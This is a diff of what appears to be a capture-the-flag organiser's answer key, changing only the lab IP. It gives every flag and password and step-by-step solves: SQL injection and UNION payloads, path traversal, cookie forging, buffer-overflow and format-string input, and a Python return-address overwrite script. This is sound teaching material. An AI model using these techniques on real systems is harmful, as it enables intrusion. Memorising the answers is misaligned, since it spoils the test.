@@ -24,7 +24,7 @@ Every hint costs points, so a team that used them can solve everything and still
 
 Each team gets 3 wrong flags per challenge, shared by its members, and a typo counts. After the third, CTFd locks that challenge for the team. To unlock it, delete one of the team's wrong submissions for it in **Admin Panel > Submissions**, then wait a minute before they try again. CTFd also stops a team for a minute if it sends more than 10 wrong flags in a minute.
 
-The commands use `192.168.8.109`. If your IP has changed, use the new one.
+The commands use `192.168.68.104`. If your IP has changed, use the new one.
 
 ## Ursa Minor (Linux)
 
@@ -41,13 +41,13 @@ The commands use `192.168.8.109`. If your IP has changed, use the new one.
 | 11 UMi | ★★ Medium | 60 | `beaconhunt` | `STARS{11um1_b34c0n_kn0ck_kn0ck}` |
 | Akhfa | ★★★ Hard | 100 | `dimmerstar` | `STARS{4khf4_p33l3d_3v3ry_l4y3r}` |
 
-Each star starts the same way: log in with `ssh <star>@192.168.8.109 -p 2220`, then enter the password from the table when asked. Nothing shows on screen while you type it. 11 UMi's account is called `umi11`, because Linux names can't start with a number. Run `exit` before moving on to the next star.
+Each star starts the same way: log in with `ssh <star>@192.168.68.104 -p 2220`, then enter the password from the table when asked. Nothing shows on screen while you type it. 11 UMi's account is called `umi11`, because Linux names can't start with a number. Run `exit` before moving on to the next star.
 
 Home folders are read-only, so anything that writes a file has to happen in `/tmp`.
 
 ### Pherkad
 
-1. Log in: `ssh pherkad@192.168.8.109 -p 2220`
+1. Log in: `ssh pherkad@192.168.68.104 -p 2220`
 2. List the files with `ls`. You'll see `welcome.txt`.
 3. Read it with `cat welcome.txt`. The flag is in it.
 
@@ -55,7 +55,7 @@ Home folders are read-only, so anything that writes a file has to happen in `/tm
 
 Hidden files, two deep this time: a hidden folder with a hidden file inside it.
 
-1. Log in: `ssh polaris@192.168.8.109 -p 2220`
+1. Log in: `ssh polaris@192.168.68.104 -p 2220`
 2. List the files with `ls`. You'll only see `README.txt`.
 3. Read it with `cat README.txt`. It says some things only show up if you ask to see all of them, and that what you find might be a place you can go into.
 4. List everything with `ls -a`. Now the folder `.observatory` appears.
@@ -65,7 +65,7 @@ Hidden files, two deep this time: a hidden folder with a hidden file inside it.
 
 ### Yildun
 
-1. Log in: `ssh yildun@192.168.8.109 -p 2220`
+1. Log in: `ssh yildun@192.168.68.104 -p 2220`
 2. List the files with `ls`. You'll only see a folder called `archive`.
 3. Locate the record with `find ~ -name star_record.txt`. It prints `/home/yildun/archive/2025/autumn/northern/little-dipper/yildun/star_record.txt`.
 4. Read it with `cat` followed by that path. That's the flag.
@@ -76,7 +76,7 @@ To teach `cd` and `ls` instead of `find`, walk down one folder at a time: `archi
 
 The flag isn't in any file. The SSH server puts it in an environment variable whenever this account logs in (a `Match User alifa` block with `SetEnv` in the box's sshd settings).
 
-1. Log in: `ssh alifa@192.168.8.109 -p 2220`
+1. Log in: `ssh alifa@192.168.68.104 -p 2220`
 2. Read `notes.txt` with `cat notes.txt`. It says the signal isn't stored in any file and is handed to you when you log in.
 3. Run `env | grep STARS`. It prints `ALIFA_SIGNAL=STARS{...}`. The part after `=` is the flag.
 
@@ -86,7 +86,7 @@ The flag isn't in any file. The SSH server puts it in an environment variable wh
 
 Two copies of a 2,400-line catalog, and every line has a code that looks like a flag, so `grep STARS` is no help.
 
-1. Log in: `ssh lambda@192.168.8.109 -p 2220`
+1. Log in: `ssh lambda@192.168.68.104 -p 2220`
 2. List the files with `ls`: `catalog-old.txt` and `catalog-new.txt`.
 3. Compare them with `diff catalog-old.txt catalog-new.txt`. It prints only line 1377:
    ```text
@@ -101,7 +101,7 @@ Two copies of a 2,400-line catalog, and every line has a code that looks like a 
 
 The challenge says the real chart is exactly 2048 bytes and owned by `cartographer`.
 
-1. Log in: `ssh kochab@192.168.8.109 -p 2220`
+1. Log in: `ssh kochab@192.168.68.104 -p 2220`
 2. Look around with `ls charts`. There are 12 folders, `sector-01` to `sector-12`, holding 900 charts between them, and every chart has a `flag:` line.
 3. Filter by size and owner with `find ~/charts -type f -size 2048c -user cartographer`, where `c` means bytes. One file is left: `/home/kochab/charts/sector-02/HIP334407.chart`.
 4. Pull out the flag line with `grep flag: ~/charts/sector-02/HIP334407.chart`. That's the flag.
@@ -112,7 +112,7 @@ Size alone still leaves several files, and so does owner alone, so both filters 
 
 A new trick on last time's log. Every reading is logged 2 to 7 times, and the real flag 11 times. Last time the flag was the reading that appeared only once, so `uniq -u` found it. Now `uniq -u` prints nothing, which is a useful "close but wrong" for returning players.
 
-1. Log in: `ssh urodelus@192.168.8.109 -p 2220`
+1. Log in: `ssh urodelus@192.168.68.104 -p 2220`
 2. Look at the format with `head -3 sky.log`. Each line is a time, a sensor and a reading.
 3. Count each reading and sort by the count:
    ```bash
@@ -126,7 +126,7 @@ A new trick on last time's log. Every reading is logged 2 to 7 times, and the re
 
 365 files with random names, one for each night of 2025, and only one was last changed on 12 August 2025. The names are made fresh every time the SSH box is built, so the name below is only an example.
 
-1. Log in: `ssh theta@192.168.8.109 -p 2220`
+1. Log in: `ssh theta@192.168.68.104 -p 2220`
 2. Filter by date with `ls -l ~/observations | grep 'Aug 12'`. One line is left, ending in a name like `obs-20add55e.log`.
 3. Read it with `cat ~/observations/` followed by that name. That's the flag.
 
@@ -136,7 +136,7 @@ A new trick on last time's log. Every reading is logged 2 to 7 times, and the re
 
 The beacon is a separate container on the CTF's private network. Players' own computers can't reach it, only the SSH box can. It listens on port 4731 and sends the flag to anyone who connects.
 
-1. Log in: `ssh umi11@192.168.8.109 -p 2220`, password `beaconhunt`.
+1. Log in: `ssh umi11@192.168.68.104 -p 2220`, password `beaconhunt`.
 2. Read `notes.txt` with `cat notes.txt`. It says the beacon answers on exactly one port between 4000 and 4999.
 3. Scan the range with `nc -zv beacon 4000-4999 2>&1 | grep succeeded`. After a few seconds it prints one line, for port 4731.
 4. Connect with `nc beacon 4731`. It prints the flag. Press Ctrl+C to get the prompt back.
@@ -147,7 +147,7 @@ Without `| grep succeeded`, `nc` prints a "Connection refused" line for every cl
 
 The layers are Base64, gzip, Base64 again, tar and gzip, in a new order from last time. Before each unwrap, run `file` to see what the current layer is.
 
-1. Log in: `ssh akhfa@192.168.8.109 -p 2220`
+1. Log in: `ssh akhfa@192.168.68.104 -p 2220`
 2. Make a private folder and go into it with `cd "$(mktemp -d)"`. Every team shares this login, so a fixed name like `/tmp/akhfa` could collide with theirs.
 3. Undo the Base64:
    ```bash
@@ -214,55 +214,55 @@ All of it as one command: `base64 -d ~/signal.dat | gunzip | base64 -d | tar -xO
 | Horsehead | ★★ Medium | 60 | `:8090` | `STARS{h0rs3h34d_us3r_4g3nt_sp00f3d}` |
 | Alnitak | ★★★ Hard | 100 | `:8086` | `STARS{4ln1t4k_un10n_s3l3ct_d33p3r}` |
 
-Open each address in a browser. The `:8082` means `http://192.168.8.109:8082`. In PowerShell, use `curl.exe`, not `curl`, which is a different command there.
+Open each address in a browser. The `:8082` means `http://192.168.68.104:8082`. In PowerShell, use `curl.exe`, not `curl`, which is a different command there.
 
 ### Betelgeuse
 
-1. Open `http://192.168.8.109:8082`.
+1. Open `http://192.168.68.104:8082`.
 2. Right-click the page and choose **View page source** (or press Ctrl+U).
 3. There are two HTML comments (lines starting `<!--`). The first is a decoy about opening hours. The second is a staff note, and the flag is the archive key inside it.
 
 ### Bellatrix
 
-1. Open `http://192.168.8.109:8083`.
-2. Add `/robots.txt` to the address: `http://192.168.8.109:8083/robots.txt`. It lists four disallowed pages: `/old-site/`, `/staff-rota/`, `/night-watch/` and `/drafts/`.
-3. Open each one. `http://192.168.8.109:8083/night-watch/` has the flag. The other three are decoys.
+1. Open `http://192.168.68.104:8083`.
+2. Add `/robots.txt` to the address: `http://192.168.68.104:8083/robots.txt`. It lists four disallowed pages: `/old-site/`, `/staff-rota/`, `/night-watch/` and `/drafts/`.
+3. Open each one. `http://192.168.68.104:8083/night-watch/` has the flag. The other three are decoys.
 
 ### Mintaka
 
 A new trick: the **Request vault access** button is switched off with the `disabled` attribute in the page's HTML, and the server never checks whether the button was allowed.
 
-1. Open `http://192.168.8.109:8084`.
+1. Open `http://192.168.68.104:8084`.
 2. Right-click the greyed-out button and choose **Inspect**. Developer tools highlight `<button type="submit" disabled>`.
 3. Double-click `disabled`, delete it and press Enter. The button turns on.
 4. Type any name in the box and click the button. The vault opens and shows the flag.
 
-Without a browser: `curl.exe -d name=me http://192.168.8.109:8084/request` sends the same request and prints the flag. Opening `/request` as a normal page shows nothing, because only the form's POST opens the vault.
+Without a browser: `curl.exe -d name=me http://192.168.68.104:8084/request` sends the same request and prints the flag. Opening `/request` as a normal page shows nothing, because only the form's POST opens the vault.
 
 ### Hatysa
 
 The page's script fetches a visitor pass from `/api/visitor-pass` and saves it in Local Storage without showing it.
 
-1. Open `http://192.168.8.109:8087`.
+1. Open `http://192.168.68.104:8087`.
 2. Press F12. Open **Application** (Chrome or Edge) or **Storage** (Firefox), then **Local Storage**, then the site's address.
 3. The key `hatysa_visitor_pass` holds the flag.
 
-Other ways in: type `localStorage.getItem("hatysa_visitor_pass")` in the Console, or open `http://192.168.8.109:8087/api/visitor-pass`, which shows the pass as JSON. Players who read the page source find the `fetch` and `localStorage.setItem` lines that point there.
+Other ways in: type `localStorage.getItem("hatysa_visitor_pass")` in the Console, or open `http://192.168.68.104:8087/api/visitor-pass`, which shows the pass as JSON. Players who read the page source find the `fetch` and `localStorage.setItem` lines that point there.
 
 ### Tabit
 
 The flag is on the page at `/`, but a `<meta http-equiv="refresh" content="0; url=/closed">` line sends the browser to `/closed` straight away. Ctrl+U shows the source of `/closed`, which has no flag.
 
-1. Type `view-source:http://192.168.8.109:8088/` into the address bar and press Enter. The source view doesn't follow the refresh.
+1. Type `view-source:http://192.168.68.104:8088/` into the address bar and press Enter. The source view doesn't follow the refresh.
 2. The flag is in the page's code, on the line `<p class="key"><code>STARS{...}</code></p>`.
 
-Other ways in: `curl.exe http://192.168.8.109:8088/` prints the same code. Or press F12, open **Network**, tick **Preserve log**, reload, click the first request (`/`) and open its **Response** tab.
+Other ways in: `curl.exe http://192.168.68.104:8088/` prints the same code. Or press F12, open **Network**, tick **Preserve log**, reload, click the first request (`/`) and open its **Response** tab.
 
 ### Rigel
 
 The login builds its database query by pasting your text straight in, so your input can change what the query means. There are four accounts: `guest` (clearance 1), `technician` (3), `archivist` (5) and `curator` (7). The key only shows at clearance 7.
 
-1. Open `http://192.168.8.109:8081`.
+1. Open `http://192.168.68.104:8081`.
 2. In the **username** box, enter `' OR 1=1 -- ` (with a trailing space after `--`). Put anything in the password box, and submit.
 3. You're signed in as `guest`, the first account. The dashboard says the key is restricted to clearance level 7, "which only the head curator has".
 4. Sign out. Enter `curator' -- ` as the username, with the trailing space, and submit. The dashboard shows the telescope key.
@@ -273,7 +273,7 @@ The login builds its database query by pasting your text straight in, so your in
 
 The site decides your rank from a cookie called `badge`, and players can edit their own cookies. The cookie is Base64 of JSON this time.
 
-1. Open `http://192.168.8.109:8085`. It shows you as a `cadet`.
+1. Open `http://192.168.68.104:8085`. It shows you as a `cadet`.
 2. Press F12. Under **Application** > **Cookies** (Firefox: **Storage** > **Cookies**), find `badge`.
 3. Decode its value with CyberChef's **From Base64**. It reads `{"name": "guest", "rank": "cadet"}`.
 4. Change `cadet` to `commander`, keeping every quote and bracket, and encode it with **To Base64**. That gives `eyJuYW1lIjogImd1ZXN0IiwgInJhbmsiOiAiY29tbWFuZGVyIn0=`.
@@ -285,9 +285,9 @@ Any name works, and JSON without the spaces works too. A value that isn't valid 
 
 Path traversal. The site opens `?page=` names from `/tmp/trapezium/pages/`, and `flag.txt` sits one folder above.
 
-1. Open `http://192.168.8.109:8089`. The links use addresses like `?page=welcome.txt`.
-2. Try a page that doesn't exist: `http://192.168.8.109:8089/?page=nothing.txt`. The error shows the full path, `/tmp/trapezium/pages/nothing.txt`.
-3. Go up one folder: `http://192.168.8.109:8089/?page=../flag.txt`. The page shows the flag.
+1. Open `http://192.168.68.104:8089`. The links use addresses like `?page=welcome.txt`.
+2. Try a page that doesn't exist: `http://192.168.68.104:8089/?page=nothing.txt`. The error shows the full path, `/tmp/trapezium/pages/nothing.txt`.
+3. Go up one folder: `http://192.168.68.104:8089/?page=../flag.txt`. The page shows the flag.
 
 `?page=flag.txt` alone doesn't work, because there's no `flag.txt` in `pages`.
 
@@ -296,7 +296,7 @@ Path traversal. The site opens `?page=` names from `/tmp/trapezium/pages/`, and 
 The archive only opens for the User-Agent `StarScope/2.0`. The page shows the User-Agent your browser sent, so players can see what they're changing.
 
 - **In Chrome or Edge:** press F12, then open the **⋮** menu > **More tools** > **Network conditions**. Under **User agent**, untick **Use browser default**, type `StarScope/2.0`, and refresh with developer tools still open. The archive shows the flag.
-- **In PowerShell:** `curl.exe -A "StarScope/2.0" http://192.168.8.109:8090` prints the page with the flag.
+- **In PowerShell:** `curl.exe -A "StarScope/2.0" http://192.168.68.104:8090` prints the page with the flag.
 
 In Firefox, the easiest way is `curl.exe`. Without `-A`, curl's own User-Agent is refused too.
 
@@ -304,7 +304,7 @@ In Firefox, the easiest way is `curl.exe`. Without `-A`, curl's own User-Agent i
 
 The same injection as Rigel, but there's no login to bypass. The flag is in another table whose name you have to discover first. The search shows 4 columns, so each injected query has to return 4 values. Type each one into the search box, with a trailing space after `--`.
 
-1. Open `http://192.168.8.109:8086` and search for anything, like `Vega`. Count the columns: 4.
+1. Open `http://192.168.68.104:8086` and search for anything, like `Vega`. Count the columns: 4.
 2. Confirm the injection with `' UNION SELECT 1, 2, 3, 4 -- `. A row reading 1, 2, 3, 4 appears. With 3 values, the page shows a database error.
 3. List the tables:
    ```text
@@ -579,13 +579,13 @@ print(out.decode())
 
 Scorpius has the same 6 programs as the first orientation, with new flags. Only Shaula's program changed: a new tour text and a new hidden menu number. Each program reads its flag from the server when it runs, so the old flags no longer work, but returning players will know the tricks.
 
-For Shaula through Acrab, connect with `ssh <star>@192.168.8.109 -p 2220` and the password `scorpius`; the login drops straight into the program. On a computer that has `nc`, you can instead connect to the matching port: Shaula 9002, Sargas 9003, Lesath 9004, Dschubba 9005, Acrab 9006. Antares needs raw bytes and is handled separately below.
+For Shaula through Acrab, connect with `ssh <star>@192.168.68.104 -p 2220` and the password `scorpius`; the login drops straight into the program. On a computer that has `nc`, you can instead connect to the matching port: Shaula 9002, Sargas 9003, Lesath 9004, Dschubba 9005, Acrab 9006. Antares needs raw bytes and is handled separately below.
 
 ### Shaula
 
 The menu shows three options, but the source has a hidden fourth case.
 
-1. Connect: `ssh shaula@192.168.8.109 -p 2220`, password `scorpius`.
+1. Connect: `ssh shaula@192.168.68.104 -p 2220`, password `scorpius`.
 2. At the `>` prompt, type `314` and press Enter.
 3. It prints `Welcome, guide. Here's tonight's code:` and the flag.
 
@@ -595,7 +595,7 @@ Last time's `42` now says "That's not on the menu."
 
 The flag costs 1000 credits and you have 100. The shop checks you can afford a purchase but doesn't stop you buying a negative quantity, which refunds credits.
 
-1. Connect: `ssh sargas@192.168.8.109 -p 2220`, password `scorpius`.
+1. Connect: `ssh sargas@192.168.68.104 -p 2220`, password `scorpius`.
 2. Choose `1` (buy maps). When asked how many, enter `-100`. That costs `-1000`, so your credits rise from 100 to 1100.
 3. Choose `2` (buy the flag). You can now afford it, and it prints the flag.
 
@@ -603,7 +603,7 @@ The flag costs 1000 credits and you have 100. The shop checks you can afford a p
 
 The name tag holds 16 characters, and the "are you an astronomer" flag sits right after it in memory. A long enough name overflows into it.
 
-1. Connect: `ssh lesath@192.168.8.109 -p 2220`, password `scorpius`.
+1. Connect: `ssh lesath@192.168.68.104 -p 2220`, password `scorpius`.
 2. When asked for your name, type 17 or more characters (e.g. `AAAAAAAAAAAAAAAAA`) and press Enter.
 3. The overflow sets the astronomer value to non-zero, and the program prints the flag.
 
@@ -611,7 +611,7 @@ The name tag holds 16 characters, and the "are you an astronomer" flag sits righ
 
 Same idea as Lesath, but the overflow has to land one exact 4-byte value in `key`. From the struct, `name` is 32 bytes and `visits` is 4, so `key` begins 36 bytes in. It must equal `0x41564f4e`, which in little-endian byte order is the text `NOVA`.
 
-1. Connect: `ssh dschubba@192.168.8.109 -p 2220`, password `scorpius`.
+1. Connect: `ssh dschubba@192.168.68.104 -p 2220`, password `scorpius`.
 2. When asked for your name, enter exactly 36 characters followed by `NOVA`:
    ```text
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANOVA
@@ -622,7 +622,7 @@ Same idea as Lesath, but the overflow has to land one exact 4-byte value in `key
 
 The program passes your input straight to `printf`, so format codes like `%s` read from memory. The flag is on the stack, at argument position 31.
 
-1. Connect: `ssh acrab@192.168.8.109 -p 2220`, password `scorpius`.
+1. Connect: `ssh acrab@192.168.68.104 -p 2220`, password `scorpius`.
 2. At the `Callsign:` prompt, enter `%31$s` and press Enter.
 3. It prints the flag on the `Transmitting:` line.
 
@@ -643,7 +643,7 @@ The address is currently `0x4017c5`, the same as last time. **Read it live each 
 - **From your own computer with Python** (reads the address automatically, so it survives a rebuild):
   ```python
   import socket, re, struct
-  s = socket.create_connection(("192.168.8.109", 9001))
+  s = socket.create_connection(("192.168.68.104", 9001))
   banner = s.recv(4096).decode(errors="replace")
   addr = int(re.search(r"supernova\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)
   s.sendall(b"A" * 72 + struct.pack("<Q", addr))
@@ -665,7 +665,7 @@ The address is currently `0x4017c5`, the same as last time. **Read it live each 
 | Tyl | ★★ Medium | 60 | `STARS{tyl_l3v3l3d_up_w1th_gdb}` |
 | Aldhibah | ★★★ Hard | 100 | `STARS{4ldh1b4h_r4nk_s3v3n_r1d3r}` |
 
-Every Draco star is on its own SSH box: `ssh <star>@192.168.8.109 -p 2222`, password `draco` for all ten. Each account's home folder holds just that star's program, and the box already has `strings`, `ltrace`, `gdb`, `objdump` and `python3`, so players install nothing. The flags are scrambled inside the programs (except Thuban's), so `strings` only works on Thuban. I solved all ten over SSH on a test copy of the box, and each level's build checks that it can still be solved.
+Every Draco star is on its own SSH box: `ssh <star>@192.168.68.104 -p 2222`, password `draco` for all ten. Each account's home folder holds just that star's program, and the box already has `strings`, `ltrace`, `gdb`, `objdump` and `python3`, so players install nothing. The flags are scrambled inside the programs (except Thuban's), so `strings` only works on Thuban. I solved all ten over SSH on a test copy of the box, and each level's build checks that it can still be solved.
 
 gdb may print a warning that it can't find the `.c` file. That's expected, because players get the program without its source, and the gdb descriptions say so.
 
@@ -673,7 +673,7 @@ gdb may print a warning that it can't find the `.c` file. That's expected, becau
 
 The "start here" level, with the steps in the description. The flag is stored in the program as plain text, but the program never prints it.
 
-1. Log in: `ssh thuban@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh thuban@192.168.68.104 -p 2222`, password `draco`.
 2. Run `strings thuban | grep STARS`.
 3. It prints the flag.
 
@@ -681,7 +681,7 @@ The "start here" level, with the steps in the description. The flag is stored in
 
 The program takes a guess after its name and compares it with the real password using `strcmp`. The real password is stored scrambled, so `strings` doesn't show it, but `ltrace` shows every library call along with its arguments.
 
-1. Log in: `ssh eltanin@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh eltanin@192.168.68.104 -p 2222`, password `draco`.
 2. Run `ltrace ./eltanin hello`.
 3. One line reads `strcmp("hello", "the-dragon-blinks")`. The second text is the password.
 4. Run `./eltanin the-dragon-blinks`. It prints `The dragon's eye opens. STARS{...}`.
@@ -692,7 +692,7 @@ The guess comes after the program's name, not at a prompt, on purpose: with a pr
 
 A new trick: the Python program keeps its password as a list of character codes.
 
-1. Log in: `ssh rastaban@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh rastaban@192.168.68.104 -p 2222`, password `draco`.
 2. `cat rastaban.py` shows `CODES = [98, 101, 116, 97, 45, 100, 114, 97, 99, 111, 110, 105, 115]` and the line `password = "".join(chr(code) for code in CODES)`.
 3. Turn the codes into letters, either way:
    - Type `python3`, then `"".join(chr(code) for code in [98, 101, 116, 97, 45, 100, 114, 97, 99, 111, 110, 105, 115])`. It shows `'beta-draconis'`. Type `exit()` to leave.
@@ -705,7 +705,7 @@ The flag in the file is XORed with the password, so it can't be read without sol
 
 The Python program checks the password one letter at a time, by position, in a jumbled order. Python counts positions from 0, which the description says.
 
-1. Log in: `ssh alsafi@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh alsafi@192.168.68.104 -p 2222`, password `draco`.
 2. `cat alsafi.py` shows `if len(guess) != 10:`, then ten checks like `if guess[3] != "w":`, out of order.
 3. Write the positions 0 to 9 in a row and put each letter under its number: `s k y w a t c h e r`.
 4. Run `python3 alsafi.py` and type `skywatcher`. It prints `Alsafi lets you in. STARS{...}`.
@@ -716,7 +716,7 @@ Typing the letters in the order the checks appear gives `Wrong password.`, which
 
 The program reads its password from an environment variable, `KUMA_EYE`. `ltrace` shows the variable's name, then the value it wants.
 
-1. Log in: `ssh kuma@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh kuma@192.168.68.104 -p 2222`, password `draco`.
 2. Run `./kuma`. It says its eye stays shut, waiting for a setting.
 3. Run `ltrace ./kuma`. One line reads `getenv("KUMA_EYE") = nil`: it asked for `KUMA_EYE`, and it isn't set.
 4. Run `KUMA_EYE=hello ltrace ./kuma`. Now one line reads `strcmp("hello", "wake-the-dragon")`.
@@ -728,7 +728,7 @@ The program reads its password from an environment variable, `KUMA_EYE`. `ltrace
 
 The program decodes the flag into memory, then scrubs it without printing it. gdb can pause the program just before the scrub.
 
-1. Log in: `ssh altais@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh altais@192.168.68.104 -p 2222`, password `draco`.
 2. Run `gdb ./altais`. `info functions` lists `main`, `decode_message`, `scrub_message` and `show_banner` at the top, under `File altais.c`.
 3. Type `break scrub_message`, then `run`.
 4. gdb pauses with `Breakpoint 1, scrub_message (message=0x7ffe... "STARS{...}")`, so the flag is already on screen. `info args` or `print message` shows it again.
@@ -738,7 +738,7 @@ The program decodes the flag into memory, then scrubs it without printing it. gd
 
 The Python program scrambles the password three ways, in a new order: it moves each letter 5 along the alphabet, reverses it, then writes it as hex. The stored value is `SCRAMBLED = "73746c6677696a6d796b74716e6679"`. Undo the steps in the opposite order.
 
-1. Log in: `ssh edasich@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh edasich@192.168.68.104 -p 2222`, password `draco`.
 2. `cat edasich.py` and copy the `SCRAMBLED` value.
 3. In CyberChef: **From Hex** (gives `stlfwijmyktqnfy`), then **Reverse** (gives `yfnqtkymjiwflts`), then **ROT13** with **Amount** `21` (gives `tailofthedragon`).
 4. Run `python3 edasich.py` and type `tailofthedragon`. It prints `Edasich lets you pass. STARS{...}`.
@@ -749,7 +749,7 @@ The program only accepts letters, and lowercases what you type.
 
 The code is a number written into the program's instructions, so `strings` can't find it. gdb shows the instructions as assembly.
 
-1. Log in: `ssh alrakis@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh alrakis@192.168.68.104 -p 2222`, password `draco`.
 2. Run `gdb ./alrakis`. `info functions` lists `check_code`, `reveal_flag` and `main`.
 3. Type `disassemble check_code`. One line reads `cmpq   $0x5e1f3,-0x8(%rbp)`. The number after `$` is the code.
 4. `quit` gdb, run `./alrakis`, and type `0x5e1f3` at the `Code:` prompt. It prints `The treasure opens. STARS{...}`.
@@ -760,7 +760,7 @@ The program reads the number with `strtol(..., 0)`, so it accepts hex with `0x` 
 
 The program only shows the flag at observer level 9000 or more, and always starts you at 1. gdb can change a variable while the program is paused.
 
-1. Log in: `ssh tyl@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh tyl@192.168.68.104 -p 2222`, password `draco`.
 2. Run `./tyl` once. It says your level is 1 and Tyl needs 9000.
 3. Run `gdb ./tyl`. Type `break check_level`, then `run`.
 4. When it pauses, `print level` shows `$1 = 1`.
@@ -772,7 +772,7 @@ Making the function `return` early, the Aldhibah trick, doesn't help here, becau
 
 The program sleeps for a thousand years in `hibernate()`, then asks `rider_rank()` for your rank, and only rank 7 hears the flag. Your rank is 0 unless you're root. gdb can make each function return early, and choose what `rider_rank()` returns. The program itself says which rank it wants, but only after the sleep.
 
-1. Log in: `ssh aldhibah@192.168.8.109 -p 2222`, password `draco`.
+1. Log in: `ssh aldhibah@192.168.68.104 -p 2222`, password `draco`.
 2. Run `gdb ./aldhibah`.
 3. Type `break hibernate`, then `run`. At the pause, type `return`, answer `y`, then `continue`.
 4. It prints `The dragon wakes and sees a rider of rank 0. It only speaks to riders of rank 7, so it goes back to sleep.`
